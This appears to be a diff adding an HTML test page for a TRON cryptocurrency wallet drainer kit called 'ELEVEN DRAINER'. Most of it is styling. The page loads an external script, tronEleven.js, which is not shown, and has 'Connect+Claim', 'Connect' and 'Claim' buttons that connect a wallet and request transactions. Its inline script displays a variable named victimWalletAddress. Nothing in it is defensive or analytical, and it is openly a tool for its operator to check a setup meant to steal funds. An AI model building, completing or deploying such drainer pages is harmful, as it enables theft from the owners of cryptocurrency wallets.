@@ -1,0 +1,347 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>ELEVEN TEST</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+
+  <style>
+    :root{
+      --bg: #050505;
+      --bg-2: #0c0c0c;
+      --card: rgba(255,255,255,0.96);
+      --text: #0a0a0a;
+      --muted: #6b7280;
+      --line: rgba(255,255,255,0.08);
+      --border: #0a0a0a;
+      --shadow: 0 30px 80px rgba(0,0,0,0.45);
+
+      --btn-dark: #0a0a0a;
+      --btn-dark-hover: #1a1a1a;
+      --btn-light: #ffffff;
+      --btn-light-hover: #f3f4f6;
+      --btn-soft: #ededed;
+      --btn-soft-hover: #e3e3e3;
+    }
+
+    * { box-sizing: border-box; }
+
+    html, body {
+      margin: 0;
+      min-height: 100%;
+    }
+
+    body{
+      font-family: "Inter", Arial, sans-serif;
+      background:
+        radial-gradient(circle at top left, rgba(255,255,255,0.08), transparent 28%),
+        radial-gradient(circle at bottom right, rgba(255,255,255,0.06), transparent 30%),
+        linear-gradient(180deg, var(--bg), var(--bg-2));
+      min-height: 100svh;
+      display: grid;
+      place-items: center;
+      padding: 24px;
+      color: var(--text);
+      overflow: hidden;
+    }
+
+    body::before{
+      content:"";
+      position: fixed;
+      inset: 0;
+      pointer-events: none;
+      background-image:
+        linear-gradient(rgba(255,255,255,0.04) 1px, transparent 1px),
+        linear-gradient(90deg, rgba(255,255,255,0.04) 1px, transparent 1px);
+      background-size: 32px 32px;
+      mask-image: radial-gradient(circle at center, black 40%, transparent 90%);
+      opacity: 0.28;
+    }
+
+    body::after{
+      content:"";
+      position: fixed;
+      width: 540px;
+      height: 540px;
+      border-radius: 50%;
+      background: radial-gradient(circle, rgba(255,255,255,0.12), transparent 68%);
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      pointer-events: none;
+      filter: blur(10px);
+      opacity: 0.8;
+    }
+
+    .card{
+      position: relative;
+      width: min(100%, 480px);
+      background: var(--card);
+      border: 1px solid rgba(10,10,10,0.95);
+      box-shadow: var(--shadow);
+      padding: 28px 24px 22px;
+      overflow: hidden;
+      backdrop-filter: blur(8px);
+    }
+
+    .card::before{
+      content:"";
+      position: absolute;
+      inset: 0;
+      pointer-events: none;
+      background:
+        linear-gradient(135deg, rgba(255,255,255,0.55), transparent 30%),
+        linear-gradient(315deg, rgba(0,0,0,0.04), transparent 35%);
+    }
+
+    .topline{
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      margin-bottom: 14px;
+      padding: 7px 11px;
+      border: 1px solid #111;
+      background: #fff;
+      font-size: 0.72rem;
+      font-weight: 800;
+      letter-spacing: 0.18em;
+      text-transform: uppercase;
+    }
+
+    .topline::before{
+      content:"";
+      width: 8px;
+      height: 8px;
+      border-radius: 50%;
+      background: #0a0a0a;
+      display: inline-block;
+    }
+
+    h1{
+      margin: 0;
+      font-size: clamp(1.7rem, 5vw, 2.2rem);
+      letter-spacing: 0.22em;
+      text-transform: uppercase;
+      font-weight: 800;
+      line-height: 1;
+    }
+
+    .subtitle{
+      margin: 14px 0 24px;
+      color: var(--muted);
+      font-size: 0.97rem;
+      line-height: 1.55;
+      font-weight: 600;
+      max-width: 32ch;
+    }
+
+    .button-stack{
+      display: grid;
+      gap: 12px;
+      margin-top: 10px;
+    }
+
+    .btn{
+      position: relative;
+      width: 100%;
+      min-height: 56px;
+      padding: 16px 18px;
+      border: 1.5px solid var(--border);
+      background: var(--btn-dark);
+      color: #fff;
+      cursor: pointer;
+      transition:
+        transform 0.12s ease,
+        background 0.18s ease,
+        box-shadow 0.18s ease,
+        border-color 0.18s ease;
+      text-transform: uppercase;
+      letter-spacing: 0.08em;
+      font-size: 0.95rem;
+      font-weight: 800;
+      text-align: left;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 14px;
+      touch-action: manipulation;
+      overflow: hidden;
+    }
+
+    .btn::before{
+      content:"";
+      position: absolute;
+      inset: 0;
+      background: linear-gradient(90deg, transparent, rgba(255,255,255,0.12), transparent);
+      transform: translateX(-120%);
+      transition: transform 0.55s ease;
+      pointer-events: none;
+    }
+
+    .btn:hover::before{
+      transform: translateX(120%);
+    }
+
+    .btn:hover{
+      transform: translateY(-1px);
+      box-shadow: 0 12px 28px rgba(0,0,0,0.14);
+    }
+
+    .btn:active{
+      transform: translateY(1px);
+    }
+
+    .btn-label{
+      display: flex;
+      flex-direction: column;
+      gap: 3px;
+    }
+
+    .btn-title{
+      font-size: 0.95rem;
+      line-height: 1.1;
+    }
+
+    .btn-sub{
+      font-size: 0.72rem;
+      font-weight: 700;
+      letter-spacing: 0.06em;
+      text-transform: none;
+      opacity: 0.72;
+    }
+
+    .btn-arrow{
+      font-size: 1.15rem;
+      font-weight: 900;
+      flex-shrink: 0;
+      transform: translateX(0);
+      transition: transform 0.18s ease;
+    }
+
+    .btn:hover .btn-arrow{
+      transform: translateX(3px);
+    }
+
+    .button-stack .btn:nth-child(1){
+      background: var(--btn-dark);
+      color: #fff;
+    }
+
+    .button-stack .btn:nth-child(2){
+      background: var(--btn-light);
+      color: #0a0a0a;
+    }
+
+    .button-stack .btn:nth-child(3){
+      background: var(--btn-soft);
+      color: #0a0a0a;
+    }
+
+    .button-stack .btn:nth-child(2):hover{
+      background: var(--btn-light-hover);
+    }
+
+    .button-stack .btn:nth-child(3):hover{
+      background: var(--btn-soft-hover);
+    }
+
+    .status-wrap{
+      margin-top: 18px;
+      padding-top: 16px;
+      border-top: 1px solid rgba(10,10,10,0.12);
+    }
+
+    .status-label{
+      margin: 0 0 8px;
+      font-size: 0.73rem;
+      font-weight: 800;
+      letter-spacing: 0.16em;
+      text-transform: uppercase;
+      color: #111;
+      opacity: 0.7;
+    }
+
+    .status{
+      margin: 0;
+      font-weight: 700;
+      color: var(--muted);
+      font-size: 0.96rem;
+      word-break: break-word;
+      line-height: 1.45;
+      min-height: 1.45em;
+    }
+
+    @media (max-width: 520px){
+      body{ padding: 16px; }
+      .card{ padding: 22px 16px 18px; }
+      .subtitle{ margin-bottom: 20px; }
+      .btn{
+        min-height: 54px;
+        padding: 14px 15px;
+      }
+      .btn-title{ font-size: 0.9rem; }
+      .btn-sub{ font-size: 0.68rem; }
+    }
+  </style>
+
+  <script type="module" crossorigin src="/assets/tronEleven.js"></script>
+</head>
+
+<body>
+  <main class="card">
+    <div class="topline">ELEVEN DRAINER</div>
+
+    <h1>ELEVEN TEST</h1>
+    <p class="subtitle">
+      Here you can safely test your configuration.
+    </p>
+
+    <div class="button-stack">
+      <button class="btn tron-cnnctAprBtn">
+        <span class="btn-label">
+          <span class="btn-title">Connect+Claim</span>
+          <span class="btn-sub">Connecting a wallet and requesting transactions (tron-cnnctAprBtn)</span>
+        </span>
+        <span class="btn-arrow">→</span>
+      </button>
+
+      <button class="btn tron-cnnctBtn">
+        <span class="btn-label">
+          <span class="btn-title">Connect</span>
+          <span class="btn-sub">Simply wallet connect (tron-cnnctBtn)</span>
+        </span>
+        <span class="btn-arrow">→</span>
+      </button>
+
+      <button class="btn tron-aprBtn">
+        <span class="btn-label">
+          <span class="btn-title">Claim</span>
+          <span class="btn-sub">Available after simply connecting your wallet; requests transactions (tron-aprBtn)</span>
+        </span>
+        <span class="btn-arrow">→</span>
+      </button>
+    </div>
+
+    <div class="status-wrap">
+      <p class="status-label">Wallet status</p>
+      <p id="wallet-address" class="status">Wallet not connected</p>
+    </div>
+  </main>
+
+  <script>
+    function formatAddress(addr) {
+      return addr ? `${addr.slice(0, 6)}…${addr.slice(-4)}` : '';
+    }
+
+    function showWalletAddress() {
+      const addressEl = document.getElementById("wallet-address");
+      addressEl.textContent = window.victimWalletAddress
+        ? `Connected: ${formatAddress(window.victimWalletAddress)}`
+        : "Wallet not connected";
+    }
+
+    setInterval(showWalletAddress, 1000);
+  </script>
+</body>
+</html>
